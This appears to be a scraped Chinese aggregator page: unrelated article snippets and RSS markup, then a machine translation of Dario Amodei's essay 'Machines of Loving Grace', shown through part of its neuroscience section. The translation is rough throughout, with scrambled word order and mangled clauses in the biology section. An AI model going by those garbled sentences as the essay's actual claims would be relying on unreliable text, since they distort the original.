How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:21 +0000</pubDate>
    </item>
    <item>
      <title>【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》</title>
      <link>https://www.ppmy.cn/news/1540846.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》news/2025/10/31 23:18:19/Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具，大概看了看，未来非常美好！ 只是生物学和身体健康 、神经科学和心理健康这两部分的前景，就非常让人兴奋！Machines of Loving GraceHow AI Could Transform the World for the Better（Machines of Loving Grace：AI如何让世界变得更好）文章链接：https://darioamodei.com/machines-of-loving-grace?continueFlag=f56b779b4c27f6251f66f92b905655fe2024年10月我经常思考和谈论强大的人工智能的风险。我担任首席执行官的Anthropic公司对如何降低这些风险进行了大量研究。因此，人们有时会得出结论，我是一个悲观主义者或“厄运者”，认为人工智能大多是坏的或危险的。我完全不这么认为。事实上，我关注风险的主要原因之一是，它们是我们与人工智能之间唯一的障碍，我认为这是一个从根本上积极的未来。我认为大多数人都低估了人工智能的好处有多大，就像我认为大多数人认为风险有多大一样。在这篇文章中，我试图勾勒出这种优势可能是什么样子——如果一切顺利，一个拥有强大人工智能的世界可能会是什么样子。当然，没有人能够确定或精确地知道未来，强大的人工智能的影响可能比过去的技术变革更不可预测，因此所有这一切不可避免地都是猜测。但我的目标是至少进行有教育意义和有用的猜测，即使大多数细节最终都是错误的，也能捕捉到会发生什么的味道。我包含了很多细节，主要是因为我认为具体的愿景比高度模糊和抽象的愿景更有助于推进讨论。然而，首先，我想简要解释一下为什么我和 Anthropic 没有过多地谈论 powerful AI 的好处，以及为什么我们可能会继续总体上大量讨论风险。特别是，我做出这个选择是出于以下愿望：最大化杠杆作用。人工智能技术的基本发展及其许多（并非全部）好处似乎是不可避免的（除非风险破坏了一切），并且从根本上是由强大的市场力量推动的。另一方面，风险不是预先确定的，我们的行动可以极大地改变其出现的可能。避免被认为是宣传。谈论人工智能所有惊人好处的人工智能公司可能会像宣传者一样，或者好像他们试图分散人们对人工智能缺点的关注。我也认为，从原则上讲，花太多时间“讲你的书”对你的灵魂有害。避免夸夸其谈。我经常对许多人工智能风险公众人物（更不用说人工智能公司的领导者）谈论后AGI世界的方式感到厌烦，就好像他们的使命是像先知带领他们的人民走向救赎一样，独自实现这一目标。我认为，将公司视为单方面塑造世界是危险的，从宗教的角度看待实际的技术目标也是危险的。避免“科幻”的包袱。尽管我认为大多数人低估了强大的人工智能的好处，但讨论激进人工智能未来的一小群人往往采用过于“科幻”的口吻（例如上传的思想、太空探索或一般的赛博朋克氛围）。我认为这会导致人们不那么认真地对待这些说法，并给它们灌输一种不切实际的感觉。需要明确的是，问题不在于所描述的技术是否可能（主体文章对此进行了详细的讨论），而更多的是“氛围”隐含地夹带着一堆文化包袱和关于什么样的未来是可取的、各种社会问题将如何发展等未明确的假设。结果往往是，对于一种狭隘的亚文化来说，阅读就像一种幻想，同时让大多数人反感。然而，尽管存在上述所有担忧，我真的认为讨论一个拥有强大人工智能的好世界会是什么样子很重要，同时尽最大努力避免上述陷阱。事实上，我认为对未来有一个真正鼓舞人心的愿景是至关重要的，而不仅仅是一个灭火计划。强大的人工智能的许多影响都是对抗性的或危险的，但归根结底，必须有一些我们正在为之奋斗的东西，一些让每个人都过得更好的正和结果，一些团结人们超越争吵、面对未来挑战的东西。恐惧是一种动力，但这还不够：我们也需要希望。强大 AI 的积极应用列表非常长（包括机器人、制造、 能量等等），但我将重点介绍在我看来具有 最有可能直接提高人类生活质量的领域。我最兴奋的五个类别：生物学和身体健康神经科学和心理健康经济发展与贫困和平与治理工作和意义按照大多数标准来判断，我的预测将是激进的（除了科幻小说中的“奇点” ），但我是认真的 而且是真诚的。我所说的一切都很容易出错（重复我上面的观点），但是我至少试图将我的观点建立在对各种领域可能会加速，这在实践中可能意味着什么。我很幸运拥有生物学和神经科学的两者兼而有之的专业，我是经济发展领域的知识渊博的业余爱好者，但是我确信我会做很多错。写这篇文章让我意识到的一件事是应该由一组领域专家（生物学、经济学、国际 关系和其他领域）来写一个更好、更明智的版本。 最好将我在这里的努力视为该组的开始。基本假设和框架为了使整篇文章更加准确和有依据，明确我们所说的强大的人工智能（即从现在开始5-10年时间跨度阈值）是有必要的，并制定一个框架来思考这种人工智能一旦出现的影响。强大的人工智能（我不喜欢AGI这个词）会是什么样子，何时（或是否）会到来，这本身就是一个巨大的话题。这是我公开讨论过的，可以写一篇完全独立的文章。显然，许多人怀疑强大的人工智能是否会很快建成，有些人甚至怀疑它是否能够建成。我认为它最早可能在2026年到来，尽管也有可能需要更长的时间。但就本文而言，我想把这些问题放在一边，假设它很快就会到来，并专注于之后5-10年会发生什么。我还想假设这样一个系统是什么样子的，它的功能是什么，以及它是如何相互作用的，尽管在这方面存在一些分歧。通过强大的人工智能，我想到了一个人工智能模型——在形式上可能与今天的大语言模型相似，尽管它可能基于不同的架构，可能涉及多个交互模型，并且可能被不同地训练——具有以下属性：√ 就纯智能而言，它在生物学、编程、数学、工程、写作等大多数相关领域都比诺贝尔奖获得者更聪明。这意味着它可以证明未解决的数学定理，写非常好的小说，从头开始写困难的代码库等。除了是一个“你可以与之交谈的智能设备”之外，它还具有虚拟工作的人类可用的所有“界面”，包括文本、音频、视频、鼠标和键盘控制以及互联网接入。它可以参与此界面启用的任何操作、通信或远程操作，包括在互联网上采取行动、向人类发出指示、订购材料、指导实验、观看视频、制作视频等。它再次以超过世界上最有能力的人的技能完成了所有这些任务。√ 它不仅仅是被动地回答问题；相反，它可以被赋予需要数小时、数天或数周才能完成的任务，然后像聪明的员工那样自主地完成这些任务，并在必要时要求澄清。√ 它没有物理实体（除了生活在计算机屏幕上），但可以通过计算机控制现有的物理工具、机器人或实验室设备；理论上，它甚至可以为自己设计机器人或设备。√ 用于训练模型的资源可以重新调整用途，以运行数百万个实例（到2027年，这将与预计的集群规模相匹配），模型可以吸收信息并以大约10-100倍的人类速度生成动作。然而，它可能受到物理世界或与其交互的软件的响应时间的限制。√ 这一百万个拷贝中的每一个都可以独立地执行无关的任务，或者如果需要，它们可以以人类协作的方式协同工作，也许可以与不同的亚群进行微调，使其特别擅长特定的任务。我们可以将其概括为“数据中心天才之国”。显然，这样一个实体能够非常快速地解决非常困难的问题，但要弄清楚速度有多快并非易事。在我看来，两个“极端”的立场都是错误的。首先，你可能会认为世界会在几秒钟或几天内立即发生变化（“奇点”），因为卓越的智能会建立在自身的基础上，几乎立即解决每一个可能的科学、工程和作战任务。这个观点的问题是，存在真正的物理和实际限制，例如在构建硬件或进行生物实验方面。即使是一个由天才组成的新国家也会遇到这些限制。智力可能非常强大，但它不是神奇的仙尘。其次，相反地，你可能会认为技术进步已经饱和，或者受到现实世界数据或社会因素的限制，而比人类智能更好的技术进步只会增加很少的东西。对我来说，这似乎同样难以置信——我能想到数百个科学甚至社会问题，在这些问题中，一大群真正聪明的人会大大加快进步，特别是如果他们不限于分析，并且可以在现实世界中实现事情（我们假设的天才之国可以做到这一点，包括指导或协助人类团队）。我认为真相很可能是这两幅极端情况的混乱混合，因任务和领域而异，细节非常微妙。我认为我们需要新的框架来以富有成效的方式思考这些细节。经济学家经常谈论“生产要素”：如劳动力、土地和资本。“劳动力、土地、资本的边际回报”一词抓住了这样一个想法，即在特定情况下，特定因素可能是也可能不是限制因素——例如，空军需要飞机和飞行员，如果你没有飞机，雇佣更多的飞行员也没有多大帮助。我认为，在人工智能时代，我们应该谈论智能的边际回报，并试图找出与智能互补的其他因素是什么，当智能非常高时，这些因素会成为限制因素。我们不习惯以这种方式思考——问“更聪明对这项任务有多大帮助，在什么时间尺度上？”——但这似乎是用非常强大的人工智能来概念化世界的正确方式。我猜测对智力有限制或补充的一系列因素包括：√ 外界的运行速度。智能代理需要和世界进行交互操作，以完成任务和学习。但世界只能运行这么快。细胞和动物以固定的速度运行，因此对它们进行实验需要一定的时间，这可能是无法减少的。硬件、材料科学、任何涉及与人沟通的事物，甚至我们现有的软件基础设施也是如此。此外，在科学中，经常需要按顺序进行许多实验，每个实验需要从后面的实验中学习后者需要建立在后面实验基础之上。所有这一切都意味着，一个重大项目（例如开发癌症疫苗）的完成速度可能有一个不可减少的最小值，即使智力继续提高，也无法进一步降低。√ 对数据的需要。有时缺乏原始数据，在没有原始数据的情况下，更多的智能也无济于事。今天的粒子物理学家非常聪明，已经开发了广泛的理论，但由于粒子加速器的数据非常有限，他们缺乏在这些理论之间进行选择的数据。目前尚不清楚，如果他们是超级智能的，除了加快建造更大的加速器之外，他们是否会做得更好。√ 内在复杂性。有些事情本质上是不可预测或混乱的，即使是最强大的人工智能也无法比今天的人类或计算机更好地预测或解开它们。例如，在一般情况下，即使是非常强大的人工智能，与今天的人类和计算机相比，也只能在混沌系统（如三体问题）中略微提前预测。√ 人类的约束。如果不违反法律、伤害人类或扰乱社会，许多事情都无法完成。一个对齐的AI不想做这些事情（如果我们有一个未对齐的AI，我们又回到了谈论风险的话题上）。许多人类社会结构效率低下，甚至有害，但在尊重临床试验的法律要求、人们改变习惯的意愿或政府行为等约束的同时，这很难改变。从技术意义上讲，进展良好，但其影响因法规或错误的恐惧而大大降低，包括核能、超音速飞行，甚至电梯。√ 物理定律。这是第一点的一个更鲜明的版本。有些物理定律似乎牢不可破。旅行不可能比光速快。芯片每平方厘米只能有这么多晶体管，否则就会变得不可靠。计算每擦除一位需要一定的最小能量，这限制了世界上的计算密度。还有一个基于时间尺度的进一步区别。从长远来看，短期内受到严格限制的事情可能会对智力更具可塑性。例如，智能可能被用来开发一种新的实验范式，使我们能够在体外学习过去需要活体动物实验的东西，或者构建收集新数据所需的工具（例如更大的粒子加速器），或者（在伦理限制范围内）找到绕过基于人类的约束的方法（例如，帮助改善临床试验系统，帮助创建临床试验官僚主义较少的新司法管辖区，或者改进科学本身，使人类临床试验不那么必要或更便宜）。因此，我们应该想象一种情况，即智力最初受到其他生产要素的严重阻碍，但随着时间的推移，智力本身越来越多地绕过其他因素，即使它们从未完全溶解（有些东西，如物理定律是绝对的）。关键问题是这一切发生的速度有多快，顺序是什么考虑到上述框架，我将尝试针对介绍。1. 生物学与健康生物学可能是科学进步最有可能直接和 明确地提高了人类的生活质量。在上个世纪，一些最古老的人类 疾病（如天花）终于被征服了，但还有更多的疾病仍然存在，并打败了 他们将是一项巨大的人道主义成就。除了治愈疾病之外，生物科学 原则上可以提高人类健康的基线质量，通过扩展健康人类 寿命，增加对自身生物过程的控制和自由，并解决日常问题 我们目前认为是人类状况中不变部分的问题。在上一节的 “限制因素” 语言中，直接应用的主要挑战 智能对生物学来说是数据、物理世界的速度和内在的复杂性（事实上， 这三者都是相互关联的）。人为限制在后期也发挥作用，当临床 涉及试验。让我们一一来看。对细胞、动物甚至化学过程的实验都受到物理速度的限制世界：许多生物方案涉及培养细菌或其他细胞，或者只是等待 发生化学反应，这有时可能需要几天甚至几周的时间，而且没有明显的方法 加快速度。动物实验可能需要数月（或更长时间），而人体实验通常需要数年（或 即使是几十年的长期结果研究）。与此相关的是，数据通常很少 数量和质量：总是缺乏清晰、明确的数据来隔离生物 来自其他 10,000 件正在发生的或干预的令人困惑的事情的兴趣影响 因果关系，或者直接衡量某些效果（而不是推断其 后果）。即使是大量的定量分子数据，如 我在研究质谱技术时收集的蛋白质组学数据很嘈杂，并且遗漏了 LOT （这些蛋白质在哪些类型的细胞中？细胞的哪个部分？在细胞的哪个阶段 周期？造成这些数据这些问题的部分原因是内在的复杂性：如果你曾经见过一张显示人类新陈代谢生物化学的图表，你就会知道它非常 很难隔离这个复杂系统的任何部分的影响，更难干预 系统。最后，不仅仅是运行所需的内在时间 作为人体实验，实际临床试验涉及大量的官僚主义和监管要求 这（在许多人看来，包括我）增加了不必要的额外时间并延迟了进度。鉴于这一切，许多生物学家长期以来一直对它的价值持怀疑态度 人工智能和生物学中更普遍的“大数据”。历史上，数学家、计算机科学家和 在过去 30 年中，将他们的技能应用于生物学的物理学家取得了相当大的成功。 但尚未产生最初希望的真正变革性影响。一些怀疑是 被 AlphaFold 等重大和革命性的突破所削弱（AlphaFold 刚刚当之无愧地为其创造者赢得了诺贝尔奖 化学）和 AlphaProteo11，但人们仍然认为 AI 是（并将继续是） 仅在有限的情况下有用。一个常见的表述是“AI 可以更好地进行分析 您的数据，但它无法生成更多数据或提高数据质量。垃圾进，垃圾出”。但我认为这种悲观的观点是对 AI 的思考是错误的。如果我们的核心假设 关于 AI 进展是正确的，那么正确的思考 AI 的方式不是作为一种数据分析的方法，而是 作为执行生物学家所有任务（包括设计和运行）的虚拟生物学家 现实世界中的实验（通过控制实验室机器人或简单地告诉人类哪些实验 运行 – 就像首席研究员对他们的研究生一样），发明新的生物方法或 测量 技术，依此类推。正是通过加快整个研究过程，AI 才能真正做到 加速生物学。我想重复一遍，因为这是最常见的误解 当我谈到 AI 改变生物学的能力时：我并不是说 AI 不仅仅是一个 工具来分析数据。根据本文开头对强大 AI 的定义，我是 谈论使用 AI 来执行、指导和改进几乎所有生物学家 做。更具体地说明我认为加速度可能来自哪里，一个惊人的大比例 生物学的进步来自于极少数的发现，这些发现通常与广泛的 测量工具或技术12允许对生物系统进行精确但通用或可编程的干预。也许有 每年 ~1 个这些重大发现，它们共同可以说推动了 &gt;50% 的生物学进步。 这些发现之所以如此强大，正是因为它们消除了内在的复杂性和数据 限制，直接增加了我们对生物过程的理解和控制。一些 每十年的发现使我们对生物学的大部分基本科学理解成为可能，并且 推动了许多最强大的医学治疗。一些示例包括：√ CRISPR：一种允许 对生物体中的任何基因进行实时编辑（将任何基因序列替换为任何 其他任意序列）。自从最初的技术被开发出来以来，一直存在着 改进了目标特定细胞类型，提高了准确性，并减少了 错误的基因——所有这些都是人类安全使用所必需的。√ 用于精确观察正在发生的事情的各种显微镜：高级光学 显微镜（采用各种荧光技术、特殊光学元件等）、电子 显微镜、原子力显微镜等√ 基因组测序和合成，在过去几十年中，成本下降了几个数量级。√ 光遗传学技术，允许您通过照射 Light on it.√ mRNA 疫苗，在 原则，允许我们设计针对任何事物的疫苗，然后快速适应它（mRNA 疫苗 课程在 COVID 期间出名）。√ 细胞疗法，如 CAR-T，允许将免疫细胞从体内取出并“重新编程”以攻击，原则上的任何事。√ 概念见解，如疾病的细菌理论或实现免疫系统和癌症13.我不厌其烦地列出所有这些技术，因为我想说：我认为他们的发现率可以提高 10 倍如果有更多 才华横溢、富有创造力的研究人员。或者，换句话说，我认为这些发现的智力很高，生物学中的其他一切都和 药物主要来自他们。我为什么这么想？因为一些问题的答案，我们应该养成问的习惯 当我们试图确定 “returns to intelligence” 时。首先，这些发现通常是由 少数研究人员，通常是同一个人重复，建议技能搜索而不是随机搜索 （后者可能表明冗长的实验是限制因素）。其次，他们通常“本来可以 被制造出来“：例如，CRISPR 是 自 80 年代，但又过了 25 年，人们才意识到它可以重新用于一般基因 编辑。由于缺乏科学界的支持，它们也经常被推迟很多年 有希望的方向（参见 mRNA 疫苗发明者的简介;类似的故事比比皆是）。第三 成功的项目通常是杂乱无章的，或者是人们最初并不认为的事后诸葛亮 有前途，而不是大量资助的努力。这表明它不仅仅是巨大的资源 专注推动发现，但独创性。最后，尽管其中一些发现具有“序列依赖性”（您需要先将发现 A 以便拥有进行发现 B） 的工具或知识——这又可能会创造实验性 延迟 — 许多（也许大多数）是独立的，这意味着可以同时处理许多延迟。双 这些事实，以及我作为生物学家的一般经验，强烈地向我表明，有数百个 如果科学家们更聪明、更善于在 人类拥有大量的生物知识（再次考虑 CRISPR 的例子）。 AlphaFold/AlphaProteo 在解决重要问题方面比人类更有效的成功， 尽管几十年来精心设计了物理建模，但提供了原理证明（尽管 narrow 工具），这应该指明前进的方向。因此，我猜测强大的 AI 至少可以以 10 倍的速度发现这些发现，从而给我们带来下一个 50-100 年的生物进步在 5-10 年内。14为什么不是 100 倍？也许这是可能的，但这里两者都是串行依赖 实验时间变得很重要：在 1 年内取得 100 年的进步需要做很多事情 第一次就做对，包括动物实验和设计显微镜或 昂贵的实验室设施。实际上，我对我们可以在 5-10 年内获得 1000 年的进步的想法持开放态度（也许听起来很荒谬），但对我们能否在 1 年内获得 100 年持怀疑态度。 另一种说法是，我认为存在一个不可避免的恒定延迟：实验和硬件设计 具有一定的“延迟”，并且需要按顺序迭代一定的“不可简化”次数 学习无法逻辑推断的东西。在临床试验呢？尽管有很多官僚主义和与之相关的放缓，但 事实是，他们的缓慢在很大程度上（尽管绝不是全部）最终源于需要 严格评估几乎不起作用或效果模糊的药物。可悲的是，大多数疗法都是如此 今天：普通的抗癌药物可以将生存期提高几个月，同时具有明显的副作用 需要仔细衡量（阿尔茨海默病药物也有类似的故事）。这导致了巨大的 研究（为了获得统计功效）和监管机构的艰难权衡 通常不擅长制作，同样是因为官僚主义和竞争的复杂性 利益。当某件事运行得非常好时，它会进行得更快：有一个加速的审批轨道和易用性 当效应量较大时，赞成率要高得多。用于 COVID 的 mRNA 疫苗于 9 年获得批准 几个月——比平常快得多。也就是说，即使在这些情况下，临床试验仍然 太慢——mRNA 疫苗可以说应该 在 ~2 个月内获得批准。但是这些类型的延迟（一种药物端到端 ~1 年）加起来 具有大规模并行化和需要一些但不是太多的迭代（“几次尝试”）是非常 与 5-10 年的彻底转变兼容。更乐观的是，人工智能支持的生物科学可能会减少临床迭代的需求 通过开发更好的动物和细胞实验模型（甚至模拟）进行试验，这些模型 准确预测人类将会发生什么。这在开发过程中尤为重要 对抗衰老过程的药物，这个过程持续了几十年，我们需要一个更快的迭代循环。最后，关于临床试验和社会障碍的话题，值得明确指出的是 在某些方面，生物医学创新有着异常出色的成功记录 部署，与其他一些技术形成鲜明对比16.正如引言中提到的，许多技术都受到 社会因素尽管在技术上运作良好。这可能表明对 AI 可以完成。但生物医学的独特之处在于，尽管开发药物的过程是 过于繁琐，一旦开发出来，它们通常会被成功部署和使用。综上所述，我的基本预测是，人工智能支持的生物学和医学将使我们能够 将人类生物学家在未来 50-100 年内取得的进展压缩为 5-10 年 年。我将这称为“压缩的 21 世纪”：在强大的 AI 之后 发展起来，我们将在几年内取得生物学和医学本来会取得的所有进步 在整个 21 世纪。尽管预测强大的 AI 在几年内能做什么本身仍然很困难，而且 投机 问“在未来 100 年里，人类可以独立做些什么？只是 看看我们在 20 世纪取得的成就，或者从前 2 个十年推断 这 21 号，或者问“10 个 CRISPR 和 50 个 CAR-T”会给我们带来什么，都提供了实用、扎实的方法 自 估计我们可能期望强大的 AI 取得的总体进展水平。下面我尝试列出我们可能期待的内容。这并非基于任何严格的方法， 和 几乎可以肯定的是，在细节上是错误的，但它试图跨越我们应该预料到的激进主义的一般水平：√ 可靠地预防和治疗几乎所有自然感染 疾病。鉴于 20 世纪抗击传染病的巨大进步，我们并不激进 想象一下，我们或多或少可以在压缩的 21 世纪 mRNA 疫苗中“完成工作”。mRNA 疫苗和 类似 技术已经为“万物疫苗”指明了方向。传染病是否完全 根除 来自世界（而不是仅仅在某些地方）取决于关于贫困的问题 和 不等式，将在第 3 节中讨论。√ 消除大多数癌症。癌症死亡率一直在下降 ~2% 过去几十年每年;因此，我们正朝着消除 第 21 名 世纪。一些亚型已经基本治愈（对于 例如使用 CAR-T 疗法的某些类型的白血病），我可能对非常有选择性感到更加兴奋 药物 它针对婴儿期的癌症并防止其生长。AI 还将使可能的治疗方案非常精细地适应癌症的个体化基因组——这些是 可能 今天，但在时间和人类专业知识方面非常昂贵，AI 应该允许我们进行扩展。 死亡率和发病率似乎有可能降低 95% 或更多。也就是说，癌症是 极其多样且适应性强，可能是这些疾病中最难完全摧毁的。它 如果各种罕见、困难的恶性肿瘤持续存在，也就不足为奇了。√ 对遗传病的非常有效的预防和治愈。大大 改良胚胎 筛查可能会使预防大多数遗传疾病成为可能，并且有些更安全、更可靠 CRISPR 的后代可以治愈现有人群的大多数遗传疾病。全身疾病 那 然而，影响很大一部分细胞可能是最后的坚持。√ 预防阿尔茨海默病。我们很难弄清楚是什么原因 阿尔茨海默病（它与 β-淀粉样蛋白有某种关系，但实际细节似乎非常复杂）。 它 似乎正是可以用更好的测量工具解决的问题类型，这些工具 隔离 生物效应;因此，我看好 AI 解决它的能力。很有可能 能 最终通过相对简单的干预措施来预防，一旦我们真正了解了什么 是 继续。也就是说，已经存在的阿尔茨海默病造成的损害可能很难逆转。√ 改进了大多数其他疾病的治疗。这是一个包罗万象的类别 其他 疾病包括糖尿病、肥胖症、心脏病、自身免疫性疾病等。大部分 这些 似乎比癌症和阿尔茨海默氏症“更容易”解决，而且在许多情况下已经处于陡峭的境地 下降。 例如，心脏病死亡人数已经下降了 50% 以上，简单的干预措施 如 GLP-1 激动剂已经在对抗肥胖和 糖尿病。√ 生物自由度。过去 70 年的特点是节育方面的进步， 生育能力、体重管理等等。但我怀疑 AI 加速 生物学 将大大扩展可能的：重量、外貌、繁殖和其他 生物过程将完全由人们控制。我们将在 生物自由的标题：每个人都应该有权选择他们想要的东西的理念 自 成为并以最吸引他们的方式生活。当然会有 重要 关于全球机会平等的问题;有关这些内容，请参见第 3 节。√ 人类寿命翻倍18。这似乎很激进， 但预期寿命增加了 在 20 世纪几乎是 2 倍（从 ~40 年到 ~75 年），因此 “compressed 21st” 会再次将其翻倍为 150。显然，减缓所涉及的干预措施 这 实际的老化过程将与上个世纪所需的不同，以 防止 （主要是儿童）因疾病过早死亡，但变化的幅度不是 史无前例19.具体 已经存在 将大鼠的最大寿命延长 25-50% 且不良影响有限的药物。和 一些 动物（例如某些类型的海龟）已经活了 200 岁，所以人类显然不是 理论上限。据猜测，需要的最重要的东西可能是可靠的、非 Goodhart 的人类衰老生物标志物，因为这将允许实验和临床试验的快速迭代。 一旦人类的寿命达到 150 岁，我们或许能够达到“逃逸速度”，从而赢得足够的时间 最 的 目前活着的人 将能够活到他们想活多久就活多久，尽管 当然 不能保证这在生物学上是可能的。值得看看这份清单，并反思如果所有这些都是 从现在起 7-12 年实现（这将符合激进的 AI 时间表）。它去了 没有 说这将是一场难以想象的人道主义胜利，一下子消灭了大部分 这 困扰人类数千年的灾祸。我的许多朋友和同事都在筹集 孩子们，当这些孩子长大后，我希望任何提到疾病的事情都会对他们产生影响。 道路 坏血病、天花或腺鼠疫 瘟疫 听起来。这一代人也将受益于增加的生物自由度和 自我表达， 如果运气好的话，他们也可以随心所欲地活多久。很难高估这些变化对除了小社区之外的每个人的惊讶程度 之 期待强大 AI 的人。例如，美国有数千名经济学家和政策专家 目前正在争论如何保持社会保障和医疗保险的偿付能力，以及更广泛地说如何 保持 降低医疗保健成本（主要由 70 岁以上的人消费，尤其是那些 癌症等绝症）。这些计划的情况可能会非常彻底 改进 如果这一切都成为现实20如 这 劳动年龄与退休人口的比例将发生巨大变化。毫无疑问，这些挑战将 是 取而代之的是其他方法，例如如何确保广泛获得新技术，但它确实是 值得 反思世界将发生多大的变化，即使生物学是唯一的领域 成功 由 AI 加速。2. 神经科学与心灵在上一节中，我主要关注物理疾病和生物学，并没有 盖 神经科学或心理健康。但神经科学是生物学的一个分支学科，而心理健康是 只 与身体健康一样重要。事实上，如果有的话，心理健康甚至会影响人类福祉 更多 直接比身体健康。数亿人的生活质量非常低，因为 成瘾、抑郁、精神分裂症、低功能自闭症、创伤后应激障碍、精神病等问题21或智力障碍。 还有数十亿人与日常问题作斗争，这些问题通常可以被解释为更温和的版本 之 这些严重的临床疾病之一。与一般生物学一样，它可能可以超越 解决问题以提高人类体验的基线质量。我为生物学制定的基本框架同样适用于神经科学。该字段为 推动 向前推进少量发现，通常与测量或精确的工具有关 介入 – 在上面的列表中，光遗传学是一项神经科学发现，最近的 CLARITY 和扩展显微镜是 进展 同样，除了许多通用的细胞生物学方法直接延续到 神经。我认为人工智能将同样加速这些进步的速度，因此 那 “5-10 年内 100 年的进步”框架适用于神经科学，其方式与 does 到生物学，原因相同。与生物学一样，20 世纪神经科学的进步是 巨大 – 例如，我们甚至不了解神经元是如何或为什么触发的，直到 因此，预期 AI 加速的神经科学将快速产生似乎是合理的 几年来的进步。我们应该在这个基本图景中添加一件事，那就是我们所拥有的一些东西 博学 （或正在学习）人工智能本身可能有助于推进神经科学， 便 它仍然只能由人类完成。可解释性就是一个明显的例子：尽管生物神经元 表面上以与人工神经元完全不同的方式运作（它们通过 峰值，并且经常是峰值速率，因此人工神经元中不存在时间元素，并且 堆 与细胞生理学和神经递质相关的细节修改了它们的操作 基本上）， 基本问题“如何执行组合的简单单元的分布式、训练网络 linear/non-linear operations work together to perform important computations“是相同的，并且 I 强烈怀疑单个神经元通信的细节在大多数情况下会被抽象出来 这 关于计算和电路的有趣问题22.仅举一个例子，计算 人工智能系统中的可解释性研究人员发现的机制最近在 老鼠的大脑。在人工神经网络上做实验比在真实神经网络上做实验要容易得多（后者通常是 需要切入动物的大脑），因此可解释性很可能成为改进我们的 对神经科学的理解。此外，强大的 AI 本身可能能够 发展 并比人类更好地应用这个工具。不过，除了可解释性之外，我们从 AI 中学到的关于如何训练智能系统的信息应该（尽管我不确定它是否已经）引起神经科学的一场革命。 什么时候 我当时在神经科学领域工作，很多人都关注我现在认为错误的事情 问题 关于学习，因为缩放假设/苦涩教训的概念没有 存在。一个简单的目标函数加上大量数据可以 驾驶 极其复杂的行为使得理解目标函数和 架构偏见和不太有趣的理解 emergent computation 的细节。我 有 近年来没有密切关注这个领域，但我隐约感觉到 Computational 神经科学家仍然没有完全吸收这个教训。我对缩放假说的态度是 总是“啊哈 – 这是对智能如何运作及其运作方式的高层次解释 容易进化“，但我不认为这是一般神经科学家的观点，部分原因是 缩放 假设作为“智能的秘密”即使在 AI 中也没有被完全接受。我认为神经科学家应该尝试将这一基本见解与特殊性相结合 之 人脑（生物物理学限制、进化历史、拓扑学、运动细节和 感官 inputs/outputs）来尝试解决神经科学的一些关键难题。有些人可能是，但我 怀疑 这还不够，AI 神经科学家将能够更有效地利用这一点 角度设置为 加快进度。我预计 AI 